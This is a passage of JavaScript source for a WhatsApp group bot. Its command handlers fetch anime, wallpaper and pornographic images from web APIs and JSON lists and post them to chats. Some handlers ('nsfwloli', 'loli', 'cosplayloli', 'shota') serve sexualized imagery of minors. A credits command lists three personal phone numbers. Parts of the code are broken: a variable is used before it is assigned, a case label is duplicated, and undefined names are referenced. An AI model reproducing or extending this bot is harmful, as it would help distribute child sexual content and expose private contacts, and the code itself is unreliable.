            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
 case 'trap' :
if (!m.isGroup) return XeonStickGroup()

 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return XeonStickGroup()

    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return XeonStickGroup()

        
XeonStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return XeonStickGroup()
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Biiofc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return XeonStickGroup()
	
        
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Biiofc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await Biiofc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break      
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

XeonStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Biiofc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break

case "tqto":{
hardztq = `6282125002189@s.whatsapp.net`
kayytq = `6289512422017@s.whatsapp.net`
kyuutq = `6287760480575@s.whatsapp.net`
Biiofc.sendMessage(from,{text:`
『 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 』 
- @${hardztq.split("@")[0]} (Recorder)
- @${kyuutq.split("@")[0]} (Helper)
- @${kayytq.split("@")[0]} (Support)
- Base Ori By RafatharOffcial

Project Script Ini Dibuat Oleh Rafathar Offcial.
Script Ini Akan Terus Berlanjut Hingga Akhir Versi Yang Ditentukan Oleh Rafathar Offcial
Dan Untuk Kalian Yang Ingin Bertanya Silahkan Chat Nomor Owner , Ketik .owner
`,mentions:[hardztq, yanztq, hanztq, fazztq]}, { quoted : fkontak})
}
break
case 'paptt':
            if (!isPremium) return reply(mess.premium)
            if (!q) return reply(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
